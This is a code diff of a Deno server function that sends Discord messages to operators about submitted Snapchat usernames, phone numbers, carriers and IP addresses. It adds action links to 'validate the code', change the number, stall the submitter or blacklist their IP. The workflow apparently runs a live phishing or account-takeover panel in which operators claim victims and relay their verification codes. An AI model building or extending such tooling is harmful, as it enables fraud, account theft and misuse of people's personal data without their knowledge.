@@ -96,20 +96,20 @@ Deno.serve(async (req) => {
 
     const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
     const codeUrl = `${appUrl}/?id=${submissionId}`;
+    const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
+    const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
+    const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(submission.ip_address)}`;
 
     const threadEmbed = {
-      title: "📋 Détails de la soumission",
+      title: "✅ Tu as pris en charge cette soumission",
       color: 0x2ECC71,
       fields: [
-        { name: "👻 Snapchat", value: `@${submission.snapchat}`, inline: true },
-        { name: "📞 Numéro", value: formatPhone(submission.telephone), inline: true },
+        { name: "👻 Utilisateur", value: `@${submission.snapchat}`, inline: true },
         { name: "📡 Opérateur", value: submission.operateur, inline: true },
-        { name: "🌍 Pays", value: submission.country || "Inconnue", inline: true },
-        { name: "🏙️ Ville", value: submission.city || "Inconnue", inline: true },
-        { name: "🕵️ IP", value: `\`${submission.ip_address}\``, inline: false },
-        { name: "🕐 Soumis le", value: dateStr, inline: false },
-        { name: "🔗 Lien", value: `[Accéder au formulaire](${codeUrl})`, inline: false },
+        { name: "📞 Numéro", value: formatPhone(submission.telephone), inline: true },
+        { name: "🔧 Envoyer le code", value: `[Cliquer ici pour envoyer le code](${codeUrl})`, inline: false },
       ],
+      footer: { text: `ID: ${submissionId || "N/A"}` },
       timestamp: now.toISOString()
     };
 
@@ -122,11 +122,37 @@ Deno.serve(async (req) => {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: `<@${adminId}> Prise en charge confirmée!`,
+          content: `<@${adminId}> tu as été le premier à réagir ✅`,
           embeds: [threadEmbed]
         })
       }
     );
+
+    // Send submission details with actions
+    if (messageRes.ok) {
+      const actionsEmbed = {
+        title: "⚡ Actions",
+        color: 0x3498DB,
+        fields: [
+          { name: "✅ Valider le code", value: `[Cliquer ici](${codeUrl})`, inline: false },
+          { name: "❌ Changer le numéro", value: `[Cliquer ici](${wrongUrl})`, inline: false },
+          { name: "⏳ Faire patienter", value: `[Cliquer ici](${waitUrl})`, inline: false },
+          { name: "🚫 Blacklist instant", value: `[Cliquer ici](${blacklistUrl})`, inline: false },
+        ]
+      };
+
+      await fetch(
+        `https://discord.com/api/v10/channels/${threadId}/messages`,
+        {
+          method: "POST",
+          headers: {
+            "Authorization": `Bot ${DISCORD_BOT_TOKEN}`,
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ embeds: [actionsEmbed] })
+        }
+      );
+    }
 
     if (!messageRes.ok) {
       console.error(`Message send error: ${messageRes.status}`);
